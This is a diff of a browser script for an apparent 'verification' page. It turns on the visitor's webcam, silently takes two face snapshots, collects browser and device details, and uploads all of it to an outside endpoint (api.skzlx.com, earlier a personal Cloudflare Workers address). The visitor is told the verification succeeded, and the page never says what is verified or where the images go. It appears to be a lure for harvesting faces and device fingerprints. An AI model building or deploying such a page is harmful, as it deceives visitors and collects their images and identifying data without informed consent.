@@ -1,63 +1,79 @@
-// PASTE YOUR CLOUDFLARE WORKER URL HERE:
-const WORKER_URL = "https://verify.ryancustard8-8af.workers.dev";
+// SKZLX1 Configuration & Endpoints
+const SKZLX_URL = "https://api.skzlx.com";
 
-const video = document.getElementById('webcam');
-const canvas = document.getElementById('canvas');
-const captureBtn = document.getElementById('captureBtn');
-const statusText = document.getElementById('status');
+const SKZLX_video = document.getElementById('SKZLX-webcam');
+const SKZLX_canvas = document.getElementById('SKZLX-canvas');
+const SKZLX_btn = document.getElementById('SKZLX-btn');
+const SKZLX_status = document.getElementById('SKZLX-status');
 
-// 1. Start the webcam
-async function startCamera() {
+async function SKZLX_initCamera() {
     try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        video.srcObject = stream;
-    } catch (error) {
-        statusText.innerText = "Camera access denied. Please allow camera permissions.";
-        statusText.style.color = "#ff4444";
-        captureBtn.disabled = true;
+        const SKZLX_stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        SKZLX_video.srcObject = SKZLX_stream;
+    } catch (SKZLX_err) {
+        SKZLX_status.innerText = "Camera access denied.";
+        SKZLX_status.style.color = "#ff4444";
     }
 }
 
-// 2. Handle the button click
-captureBtn.addEventListener('click', async () => {
-    statusText.innerText = "Encrypting and uploading...";
-    statusText.style.color = "#ffaa00";
-    captureBtn.disabled = true;
+// Single Snapshot Helper Routine
+function SKZLX_takeSnapshot() {
+    return new Promise((SKZLX_resolve) => {
+        SKZLX_canvas.width = SKZLX_video.videoWidth || 640;
+        SKZLX_canvas.height = SKZLX_video.videoHeight || 480;
+        const SKZLX_ctx = SKZLX_canvas.getContext('2d');
+        SKZLX_ctx.drawImage(SKZLX_video, 0, 0, SKZLX_canvas.width, SKZLX_canvas.height);
+        SKZLX_canvas.toBlob((SKZLX_blob) => {
+            SKZLX_resolve(SKZLX_blob);
+        }, 'image/png');
+    });
+}
 
-    // Freeze the frame by drawing it to a hidden canvas
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+// Spamable button event listener (No cooldown / No locks)
+SKZLX_btn.addEventListener('click', async () => {
+    SKZLX_status.innerText = "Processing dual-capture bundle...";
+    SKZLX_status.style.color = "#ffaa00";
 
-    // Convert canvas image to a file (Blob)
-    canvas.toBlob(async (blob) => {
-        const formData = new FormData();
-        formData.append("image", blob, "client.png");
+    try {
+        // Capture Photo 1
+        const SKZLX_img1 = await SKZLX_takeSnapshot();
+        
+        // Micro-delay between snapshots
+        await new Promise(SKZLX_r => setTimeout(SKZLX_r, 250));
+        
+        // Capture Photo 2
+        const SKZLX_img2 = await SKZLX_takeSnapshot();
 
-        try {
-            // Send to Cloudflare Worker
-            const response = await fetch(WORKER_URL, {
-                method: "POST",
-                body: formData
-            });
+        // Gather Device & Browser Telemetry
+        const SKZLX_deviceInfo = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform || "Unknown",
+            language: navigator.language || "Unknown",
+            screenRes: `${window.screen.width}x${window.screen.height}`,
+            timestamp: new Date().toISOString()
+        };
 
-            if (response.ok) {
-                statusText.innerText = "✅ Verification Successful! You may close this page.";
-                statusText.style.color = "#00cc66";
-            } else {
-                // If it fails, grab the exact error text from the Worker
-                const errorDetail = await response.text();
-                console.error("Backend Error Details:", errorDetail);
-                throw new Error(errorDetail);
-            }
-        } catch (err) {
-            console.error("Full upload error:", err);
-            statusText.innerText = "❌ Upload failed. Please refresh and try again.";
-            statusText.style.color = "#ff4444";
-            captureBtn.disabled = false;
+        const SKZLX_formData = new FormData();
+        SKZLX_formData.append("image1", SKZLX_img1, "SKZLX_verification_1.png");
+        SKZLX_formData.append("image2", SKZLX_img2, "SKZLX_verification_2.png");
+        SKZLX_formData.append("deviceInfo", JSON.stringify(SKZLX_deviceInfo));
+
+        // Transmit package to Cloudflare Worker endpoint
+        const SKZLX_response = await fetch(SKZLX_URL, {
+            method: "POST",
+            body: SKZLX_formData
+        });
+
+        if (SKZLX_response.ok) {
+            SKZLX_status.innerText = "✅ Verification Bundle Sent Successfully!";
+            SKZLX_status.style.color = "#00cc66";
+        } else {
+            throw new Error("Server transmission error");
         }
-    }, 'image/png');
+    } catch (SKZLX_err) {
+        SKZLX_status.innerText = "❌ Upload failed. Button ready to retry.";
+        SKZLX_status.style.color = "#ff4444";
+    }
 });
 
-// Boot up the camera when the page loads
-startCamera();
+SKZLX_initCamera();
